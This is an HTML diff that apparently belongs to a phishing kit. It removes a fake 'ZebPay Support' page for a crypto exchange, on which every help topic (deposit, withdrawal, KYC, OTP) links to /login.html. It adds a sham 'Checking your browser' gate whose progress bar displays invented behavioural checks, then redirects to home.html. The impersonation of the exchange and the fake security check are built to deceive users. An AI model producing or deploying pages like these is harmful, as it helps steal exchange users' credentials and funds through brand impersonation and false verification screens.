@@ -1,212 +1,138 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>ZebPay Support</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-  </head>
+<head>
+  <meta charset="UTF-8">
+  <title>Checking your browser...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-  <body class="bg-gray-100 min-h-screen flex items-center justify-center p-4">
-    <div class="bg-white w-full max-w-6xl rounded-3xl shadow-2xl p-6 md:p-10">
-      <!-- HEADER -->
-      <div
-        class="flex flex-col md:flex-row md:items-center md:justify-between gap-6"
-      >
-        <!-- Brand -->
-        <div class="flex items-center gap-4">
-         <svg width="52" height="52" viewBox="0 0 64 64" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-                            <rect width="64" height="64" rx="12" fill="#1F6FFF"></rect>
-                            <path d="M20 44L44 20" stroke="#fff" stroke-width="4" stroke-linecap="round"></path>
-                            <path d="M20 20L44 44" stroke="#fff" stroke-width="4" stroke-linecap="round"></path>
-                        </svg>
-          <h1 class="text-2xl font-semibold text-gray-800">ZebPay Support</h1>
-        </div>
+  <style>
+    body {
+      background: #ffffff;
+      color: #111827;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
 
-        <!-- Search -->
-        <div class="w-full md:w-1/2 relative">
-          <input
-            id="searchInput"
-            type="text"
-            placeholder="Search topics — deposit, withdraw, KYC..."
-            class="w-full bg-gray-100 rounded-xl py-3 pl-10 pr-4 focus:outline-none focus:ring-2 focus:ring-blue-500"
-          />
-          <span class="absolute left-3 top-3 text-gray-400">🔍</span>
-        </div>
-      </div>
+    .box {
+      width: 360px;
+      text-align: center;
+      border: 1px solid #e5e7eb;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+    }
 
-      <!-- TIP -->
-      <div class="bg-blue-50 text-blue-600 text-sm rounded-xl p-4 mt-6">
-        Tip: use the search box to quickly find topics (eg. "deposit", "KYC",
-        "wallet").
-      </div>
+    .progress {
+      width: 100%;
+      height: 16px;
+      background: #e5e7eb;
+      border-radius: 8px;
+      overflow: hidden;
+      margin-top: 20px;
+      position: relative;
+    }
 
-      <!-- GRID -->
-      <div id="topicsGrid" class="grid sm:grid-cols-2 gap-6 mt-8">
-        <!-- Deposit -->
-        <a
-          href="/login.html"
-          class="topic bg-gray-50 p-6 rounded-2xl border hover:shadow-lg transition flex gap-4"
-          data-keywords="deposit bank transfer pending"
-        >
-          <div
-            class="w-14 h-14 rounded-xl bg-gradient-to-br from-blue-500 to-blue-700 flex items-center justify-center text-white text-xl shadow-md"
-          >
-            💸
-          </div>
-          <div>
-            <h3 class="font-semibold text-lg">Deposit issue</h3>
-            <p class="text-gray-500 text-sm">
-              Money not credited / pending deposit
-            </p>
-          </div>
-        </a>
+    .bar {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #2563eb, #60a5fa);
+      transition: width 0.3s ease;
+    }
 
-        <!-- Withdraw -->
-        <a
-          href="/login.html"
-          class="topic bg-gray-50 p-6 rounded-2xl border hover:shadow-lg transition flex gap-4"
-          data-keywords="withdraw payout transfer failed"
-        >
-          <div
-            class="w-14 h-14 rounded-xl bg-gradient-to-br from-orange-400 to-red-500 flex items-center justify-center text-white text-xl shadow-md"
-          >
-            🏦
-          </div>
-          <div>
-            <h3 class="font-semibold text-lg">Withdraw issue</h3>
-            <p class="text-gray-500 text-sm">
-              Unable to withdraw or payout failed
-            </p>
-          </div>
-        </a>
+    .start-btn {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      padding: 4px 12px;
+      font-size: 14px;
+      font-weight: bold;
+      color: white;
+      background-color: #2563eb;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+      pointer-events: all;
+      z-index: 2;
+    }
 
-        <!-- Missing Token -->
-        <a
-          href="/login.html"
-          class="topic bg-gray-50 p-6 rounded-2xl border hover:shadow-lg transition flex gap-4"
-          data-keywords="token missing network erc20"
-        >
-          <div
-            class="w-14 h-14 rounded-xl bg-gradient-to-br from-yellow-400 to-yellow-600 flex items-center justify-center text-white text-xl shadow-md"
-          >
-            🪙
-          </div>
-          <div>
-            <h3 class="font-semibold text-lg">Missing token</h3>
-            <p class="text-gray-500 text-sm">
-              Token missing from wallet or wrong network
-            </p>
-          </div>
-        </a>
+    .status {
+      margin-top: 15px;
+      font-size: 14px;
+      color: #374151;
+    }
+  </style>
+</head>
+<body>
 
-        <!-- Irregular Balance -->
-        <a
-          href="/login.html"
-          class="topic bg-gray-50 p-6 rounded-2xl border hover:shadow-lg transition flex gap-4"
-          data-keywords="balance incorrect mismatch irregular"
-        >
-          <div
-            class="w-14 h-14 rounded-xl bg-gradient-to-br from-green-500 to-green-700 flex items-center justify-center text-white text-xl shadow-md"
-          >
-            ⚖️
-          </div>
-          <div>
-            <h3 class="font-semibold text-lg">Irregular balance</h3>
-            <p class="text-gray-500 text-sm">
-              Balance mismatch or unexpected changes
-            </p>
-          </div>
-        </a>
+  <div class="box">
+    <h2>Verify Your Are Human</h2>
+    <p>Click the button to start the security check.</p>
 
-        <!-- Whitelist -->
-        <a
-          href="/login.html"
-          class="topic bg-gray-50 p-6 rounded-2xl border hover:shadow-lg transition flex gap-4"
-          data-keywords="whitelist wallet address"
-        >
-          <div
-            class="w-14 h-14 rounded-xl bg-gradient-to-br from-purple-500 to-indigo-600 flex items-center justify-center text-white text-xl shadow-md"
-          >
-            🔐
-          </div>
-          <div>
-            <h3 class="font-semibold text-lg">Whitelist wallet</h3>
-            <p class="text-gray-500 text-sm">
-              Add or manage whitelisted addresses
-            </p>
-          </div>
-        </a>
-
-        <!-- Validate Account -->
-        <a
-          href="/login.html"
-          class="topic bg-gray-50 p-6 rounded-2xl border hover:shadow-lg transition flex gap-4"
-          data-keywords="validate otp verification login"
-        >
-          <div
-            class="w-14 h-14 rounded-xl bg-gradient-to-br from-cyan-400 to-blue-500 flex items-center justify-center text-white text-xl shadow-md"
-          >
-            ✅
-          </div>
-          <div>
-            <h3 class="font-semibold text-lg">Validate Account</h3>
-            <p class="text-gray-500 text-sm">
-              OTP, account verification & login help
-            </p>
-          </div>
-        </a>
-
-        <!-- KYC -->
-        <a
-          href="/login.html"
-          class="topic bg-gray-50 p-6 rounded-2xl border hover:shadow-lg transition flex gap-4"
-          data-keywords="kyc documents verification passport"
-        >
-          <div
-            class="w-14 h-14 rounded-xl bg-gradient-to-br from-indigo-400 to-indigo-600 flex items-center justify-center text-white text-xl shadow-md"
-          >
-            🧾
-          </div>
-          <div>
-            <h3 class="font-semibold text-lg">KYC</h3>
-            <p class="text-gray-500 text-sm">
-              Upload documents or check verification status
-            </p>
-          </div>
-        </a>
-      </div>
-
-      <!-- FOOTER -->
-      <div class="flex justify-between items-center text-sm mt-10">
-        <div>
-          Can’t find your issue?
-          <a
-            href="/login.html"
-            class="text-blue-600 font-semibold hover:underline"
-          >
-            Contact support
-          </a>
-        </div>
-        <div class="text-gray-400">Live Response</div>
-      </div>
+    <div class="progress" id="progressBar">
+      <div class="bar" id="bar"></div>
+      <button class="start-btn" id="startBtn">Click Here</button>
     </div>
 
-    <script>
-      const input = document.getElementById("searchInput");
-      const topics = document.querySelectorAll(".topic");
+    <div class="status" id="status">Waiting for your click...</div>
+  </div>
 
-      input.addEventListener("input", function () {
-        const value = this.value.toLowerCase().trim();
+<script>
+  const startBtn = document.getElementById("startBtn");
+  const bar = document.getElementById("bar");
+  const status = document.getElementById("status");
 
-        topics.forEach((topic) => {
-          const text = topic.textContent.toLowerCase();
-          const keywords = topic.dataset.keywords.toLowerCase();
+  const checks = [
+    "Checking if you are human...",
+    "Analyzing mouse and keyboard behavior...",
+    "Verifying interaction speed...",
+    "Confirming browser activity...",
+    "Finalizing human verification..."
+];
 
-          topic.style.display =
-            text.includes(value) || keywords.includes(value) ? "flex" : "none";
-        });
-      });
-    </script>
-  </body>
+
+  let progress = 0;
+  let step = 0;
+  let interval;
+
+  startBtn.addEventListener("click", () => {
+    // Prevent multiple clicks
+    if (interval) return;
+
+    status.innerText = "Starting security check...";
+    startBtn.style.display = "none"; // hide button
+
+    interval = setInterval(() => {
+      progress += Math.floor(Math.random() * 12) + 8;
+      if (progress > 100) progress = 100;
+
+      bar.style.width = progress + "%";
+
+      if (step < checks.length) {
+        status.innerText = checks[step];
+        step++;
+      }
+
+      if (progress === 100) {
+        clearInterval(interval);
+        status.innerText = "Verification complete!";
+        sessionStorage.setItem("humanVerified", "true");
+        setTimeout(() => {
+          window.location.href = "home.html";
+        }, 500);
+      }
+    }, 700);
+  });
+
+  // Optional bot detection
+  if (!navigator.cookieEnabled || !navigator.userAgent) {
+    document.body.innerHTML = "<h2>Access denied</h2>";
+    throw new Error("Bot detected");
+  }
+</script>
+
+</body>
 </html>
